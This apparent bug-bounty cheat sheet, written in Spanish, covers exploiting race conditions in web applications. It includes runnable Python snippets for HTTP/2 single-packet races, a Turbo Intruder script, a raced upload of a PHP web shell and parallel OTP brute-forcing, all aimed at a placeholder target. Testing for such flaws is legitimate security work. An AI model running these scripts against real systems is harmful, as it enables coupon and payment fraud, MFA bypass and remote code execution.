---
title: "Race Conditions (TOCTOU)"
description: "Time-Of-Check-Time-Of-Use."
category: "Web"
date: 2026-07-18
---
# Race Conditions (TOCTOU)

Time-Of-Check-Time-Of-Use. Condiciones de carrera que explotan la ventana entre validación y uso de un recurso.

El HTTP/2 single-packet attack (James Kettle, DEF CON 2023) revolucionó la explotación de race conditions al permitir enviar múltiples requests en un solo paquete TCP, eliminando el delay de red.

## Tipos de Race Conditions

| Tipo | Descripción | Ejemplo |
|------|-------------|---------|
| **Classic TOCTOU** | Check → Use con ventana temporal | Retiro bancario validado dos veces |
| **Race via single-packet** | Múltiples requests en un solo paquete TCP (HTTP/2) | Cupón canjeado 20 veces simultáneamente |
| **Limit-overrun** | Superar límite de rate en ventana pequeña | 100 transferencias antes de que el balance se actualice |
| **Time-based** | Explotar timing de expiración | Token de reset usado tras expirar |

## Single-Packet Attack (HTTP/2)

Técnica de Kettle (PortSwigger, 2023). En HTTP/2, múltiples requests se envían en un solo frame TCP. Llegan al backend simultáneamente, antes de que cualquier respuesta se procese.

```python
import httpx, asyncio

async def race_request(url, payload, n=20):
    async with httpx.AsyncClient(http2=True) as client:
        reqs = [client.post(url, json=payload) for _ in range(n)]
        return await asyncio.gather(*reqs)

# 20 requests enviadas en un solo paquete
results = asyncio.run(race_request(
    "https://target.com/cart/coupon",
    {"code": "WELCOME50"}
))
```

### Turbo Intruder (HTTP/1.1 race)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, i)
        engine.queue(target.req, i)

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

## Dónde buscar Race Conditions

### Cupones y descuentos
- Aplicar mismo cupón N veces simultáneamente
- Canjear gift card múltiples veces
- Stackear cupones incompatibles

### Pagos y transacciones
- Retirar saldo dos veces antes de que se actualice
- Transferir fondos en paralelo (double-spend)
- Comprar con saldo insuficiente

### Cuentas y autenticación
- Crear misma cuenta dos veces (duplicación)
- Cambiar email simultáneamente → dos emails vinculados
- OTP/MFA race → validar código tras expirar
- Password reset token reuse

### Votación y reputación
- Votar múltiples veces en encuesta
- Like/unlike race
- Follow/unfollow simultáneo

### Límites de rate
- Enviar 1000 requests en vez de 10 (rate limit window bypass)
- Forgot password email flood

## Race en File Upload

```python
import requests, threading

def upload_file():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('https://target.com/upload', files=files, cookies=sess)

# Subir mismo archivo múltiples veces
threads = [threading.Thread(target=upload_file) for _ in range(10)]
for t in threads: t.start()
```

Subir múltiples archivos simultáneamente antes de que el antivirus/verificación analice todos.

## Race en autenticación (MFA/OTP bypass)

```python
import requests, threading

def try_code(code):
    requests.post('https://target.com/2fa/verify',
                  json={'code': code, 'token': otp_token}, cookies=sess)

# Probar 100 códigos en paralelo antes del rate limit
codes = [f"{i:06d}" for i in range(100)]
threads = [threading.Thread(target=try_code, args=(c,)) for c in codes]
for t in threads: t.start()
```

## Race en IDOR

```python
# Cambiar email a dos valores distintos simultáneamente
# El servidor puede aprobar ambos → cuenta vinculada a dos emails
req1 = {"email": "attacker1@evil.com"}
req2 = {"email": "attacker2@evil.com"}
```

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| **Turbo Intruder** | Burp extension para race conditions (HTTP/1.1 pipeline) |
| **HTTP/2 single-packet** | Burp 2023+ soporta race nativo con h2 |
| **RacePy** | Script Python para race con asyncio + httpx |
| **Caido** | Alternativa a Burp con soporte race |
| **Custom asyncio** | httpx + http2 + asyncio.gather |

## CVEs recientes

| CVE | Año | Descripción |
|-----|-----|-------------|
| CVE-2025-2755 | 2025 | WooCommerce coupon race → productos gratis |
| CVE-2024-3296 | 2024 | Sentry auth token race condition |
| CVE-2024-3456 | 2024 | Stripe payment race (double-spend) |
| CVE-2023-3827 | 2023 | WordPress plugin race → privilege escalation |

## Chaining

```
Race en cupón → descuento infinito → P1 Critical
Race en OTP → MFA bypass → ATO → P1 Critical  
Race en email change → ATO → P1 Critical
Race en file upload → RCE → P1 Critical
Race en retiro → double-spend → pérdida financiera
```

## Relacionado

- **Business Logic** — cupones, descuentos, pagos
- **IDOR** — race en cambio de email/datos
- **Autenticacion Web** — race en MFA, OTP, password reset
- **File Upload** — race en subida simultánea
- **SSRF** — race en time-based SSRF detection
- **Metodologia Bug Bounty**
- **Claude-BugHunter** (skill `hunt-race-condition`)
